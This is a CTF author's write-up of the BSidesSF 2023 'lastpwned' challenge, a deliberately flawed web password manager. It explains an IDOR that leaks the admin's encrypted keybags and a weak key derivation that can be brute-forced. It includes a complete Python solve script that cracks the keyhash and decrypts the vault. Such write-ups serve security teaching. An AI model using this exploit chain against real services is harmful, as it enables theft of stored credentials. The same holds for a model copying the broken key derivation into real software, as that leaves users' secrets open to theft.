---
layout: post
title: "BSidesSF CTF 2023: Lastpwned (Author Writeup)"
category: Security
date: 2023-04-23
tags:
  - CTF
  - BSidesSF
---

I was the challenge author for a handful of challenges for this year's BSidesSF
CTF.  One of those challenges was **`lastpwned`**, inspired by a recent
high-profile data breach.  This challenge provided a web-based password manager
with client-side encryption.

<!--more-->

The challenge description read:

> It's 2023, so it's finally time that people use a password manager. We've got
> our zero-knowledge solution ready to go. To prove our trust in it, the admin
> is even using it for their passwords too!

Visiting the challenge website, players are presented with a page to login or
register.  Registering gives us an account, and presents a UI with several
pages, including passwords and history.  In the passwords page, we can add and
view our encrypted passwords.  On the history page, we see a list of historical
versions of our encrypted passwords, and clicking on one loads the historical
"keybag".

Several API endpoints are revealed by watching traffic as we browse these pages:

* /api/register
* /api/login
* /api/keybag
* /api/keybag/history
* /api/keybag/history/<username>/<generation>

All the keybag endpoints require authentication.  A player who tries to alter
the username in the history may discover that a missing authorization check
leads to an insecure direct object reference (IDOR).  This allows us to retrieve
the encrypted "keybags" for other users of the service.  If we check the
username `admin`, we can download several historical keybags belonging to the
admin.

Each "keybag" comes with some metadata as a JSON object, looking something like
this:

```
{
  "generation":2,
  "keyhash": "ef4162320ca407c402a2498b630c4b392dc82d340af2f8827aaa6799e03c93f9",
  "iterations":100,
  "created":"2023-04-20 16:20:00",
  "keybag":"base64data"
}
```

For the `admin` account, some of the historical keybags have the iterations
count set to `1` rather than the current default of `100`.  Looking at the
client-side aspects of the challenge reveals a React-based frontend that
includes a `lib.js` library of functions, including all of the
encryption/decryption logic.  There are helper functions for making HTTP
requests, but also some functions relating to cryptography:

* `deriveKey(salt, password, iter)`
* `loadLatestKeybag()`
* `loadKeybag(keybagData)`

Looking at `loadKeybag` we see that the `keyhash` value in the keybag is
compared to a value that is determined during key derivation.  Since we want to
figure out what this key is to decrypt the encrypted data, examining the
`deriveKey` function may be useful.

```
async function deriveKey(salt, password, iter) {
  const utf8encode = new TextEncoder();
  const rawSalt = utf8encode.encode(salt);
  const rawPassword = utf8encode.encode(password);
  const saltedData = [];
  let i = 0;
  while (true) {
    if (i >= rawSalt.length || i >= rawPassword.length) {
      break;
    }
    saltedData.push(rawSalt[i] ^ rawPassword[i]);
    i++;
  }
  let keyData = new Uint8Array(saltedData);
  for (let i=0; i<iter; i++) {
    keyData = await window.crypto.subtle.digest("SHA-256", keyData);
  }
  let keyHash = await window.crypto.subtle.digest("SHA-256", keyData);
  const keyHashHex = toHexString(new Uint8Array(keyHash));
  return {
    keyData: keyData,
    keyHash: keyHashHex,
  };
};
```

The function begins by xor'ing the first characters of the salt and the password
together to produce `saltedData`.  The number of chracters is limited by the
lengths of the salt and the password, and it uses the shorter of the two values.
This value is SHA-256 hashed to produce the raw key, and then SHA-256'd a second
time to produce the `keyHash`, which is compared (in hex) to the `keyHash` from
the `keybag` API endpoints.

To figure out how the salt and password are passed in, we look for invocations
of `deriveKey`.  It is invokved for keybag decryption as:

```
    const newkey = await deriveKey(
      userCreds.username, userCreds.password, keybagData.iterations);
```

The password is, unsurprisingly, the user's password.  The salt appears to be
the username.  Looking elsewhere in the library, the `userCreds` variables is
set to the variables sent to the `login` or `register` endpoints.  In `app.jsx`,
it can be seen that these are just the raw user input converted to lower case.

At this point, we know the keyhash should be the SHA-256 of the SHA-256 of the
exclusive-or of "admin" and the first 5 characters of the admin's password in
lowercase.  At this point we can attempt to crack the hash using this
information and a list of all 5 character permutations of lower-case letters and
digits.

I chose to implement a solution in Python and used the following code:

```
class KeyData:

    def __init__(self, salt, password, i=1):
        kd = self.xor(salt.encode(), password.encode())
        for i in range(i):
            kd = hashlib.sha256(kd).digest()
        self.key = kd
        self.keyhash = hashlib.sha256(kd).hexdigest()

    @staticmethod
    def xor(a, b):
        return bytes(x^y for x,y in zip(a, b))

    def __repr__(self):
        return '<Key: "{}", KeyHash: "{}">'.format(
                binascii.hexlify(self.key),
                self.keyhash,
                )


def crack_keybag(keybag):
    start = time.time()
    salt = "admin"
    alpha = string.ascii_lowercase + string.digits
    combs = itertools.product(alpha, repeat=len(salt))
    i = 0
    try:
        for c in combs:
            i += 1
            k = KeyData(salt, ''.join(c), i=keybag["iterations"])
            if k.keyhash == keybag["keyhash"]:
                print(''.join(c))
                return k
    finally:
        end = time.time()
        print('Cracking time: {:0.2f} / {:d}'.format(end-start, i))
```

`itertools.product` produces all of the permutations (with replacement) of the
characters of the length of the salt, then we `xor` the data together (in the
`KeyData`  class) and hash `iterations+1` to find the keyhash, then compare it
to the data from our keybag.  (On my laptop, this takes about one minute to
complete.)

As a side note, the letters are also from (many) dictionary words.  The [xkcd
hint](https://xkcd.com/936/) on the homepage was intended to suggest that it did not have to be all
permutations but just prefixes of English words.  From the dictionary I was
using, this is about 60,000 combinations, or about 0.01% of the problem space of
a pure brute force.

This enables decrypting the keybag using the same decryption routines present in
the Javascript library, or implemented separately in python.  Doing this, we
find a few credentials, one of which is labeled as the flag.

Complete solution script:

```
import requests
import json
import sys
import random
import string
import hashlib
import base64
import time
import itertools
import binascii
from Crypto.Cipher import AES


class KeyData:

    def __init__(self, salt, password, i=1):
        kd = self.xor(salt.encode(), password.encode())
        for i in range(i):
            kd = hashlib.sha256(kd).digest()
        self.key = kd
        self.keyhash = hashlib.sha256(kd).hexdigest()

    @staticmethod
    def xor(a, b):
        return bytes(x^y for x,y in zip(a, b))

    def __repr__(self):
        return '<Key: "{}", KeyHash: "{}">'.format(
                binascii.hexlify(self.key),
                self.keyhash,
                )


class Solver:

    def __init__(self, endpoint):
        self.endpoint = endpoint
        if self.endpoint[-1] == "/":
            self.endpoint = self.endpoint[:-1]
        self.token = None

    def post(self, path, data):
        headers = {
                'Content-type': 'application/json',
        }
        if self.token is not None:
            headers['X-Auth-Token'] = self.token
        resp = requests.post(self.endpoint+path, data=json.dumps(data),
                             headers=headers)
        resp.raise_for_status()
        return resp.json()

    def get(self, path):
        headers = {}
        if self.token is not None:
            headers['X-Auth-Token'] = self.token
        resp = requests.get(self.endpoint+path, headers=headers)
        resp.raise_for_status()
        return resp.json()

    def register_new_user(self):
        username = random_string()
        password = random_string()
        data = {
                "username": username,
                "password": password,
                "confirm": password,
        }
        resp = self.post("/api/register", data)
        if not resp["success"]:
            raise ValueError("register failed")
        self.token = resp["token"]

    def get_admin_keybag(self):
        return self.get("/api/keybag/history/admin/4")

    @staticmethod
    def split_keybag(kbdata):
        iv_len = 96//8
        kbbytes = base64.b64decode(kbdata)
        return kbbytes[:iv_len], kbbytes[iv_len:]

    @staticmethod
    def crack_keybag(keybag):
        start = time.time()
        salt = "admin"
        alpha = string.ascii_lowercase + string.digits
        combs = itertools.product(alpha, repeat=len(salt))
        i = 0
        try:
            for c in combs:
                i += 1
                k = KeyData(salt, ''.join(c), i=keybag["iterations"])
                if k.keyhash == keybag["keyhash"]:
                    print(''.join(c))
                    return k
        finally:
            end = time.time()
            print('Cracking time: {:0.2f} / {:d}'.format(end-start, i))

    @staticmethod
    def decrypt(iv, ctext, key):
        cipher = AES.new(key.key, mode=AES.MODE_GCM, nonce=iv)
        mac = ctext[-16:]
        ctext = ctext[:-16]
        return cipher.decrypt_and_verify(ctext, mac)

    def solve(self):
        self.register_new_user()
        keybag = self.get_admin_keybag()
        print(keybag)
        kd = self.crack_keybag(keybag)
        if not kd:
            print("No keyhash found!!")
            sys.exit(1)
        print(repr(kd))
        iv, ctext = self.split_keybag(keybag["keybag"])
        dec = self.decrypt(iv, ctext, kd)
        print(dec)
        keys = json.loads(dec)
        flag = None
        for k in keys:
            if k["title"] == "Flag":
                flag = k["password"]
        if flag is None:
            raise ValueError("no flag found")
        print(flag)

def main():
    if len(sys.argv) != 2:
        print('Usage: %s endpoint' % sys.argv[0])
        sys.exit(1)
    endpoint = sys.argv[1]
    solver = Solver(endpoint)
    solver.solve()


def random_string(l=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))


if __name__ == '__main__':
    main()
```
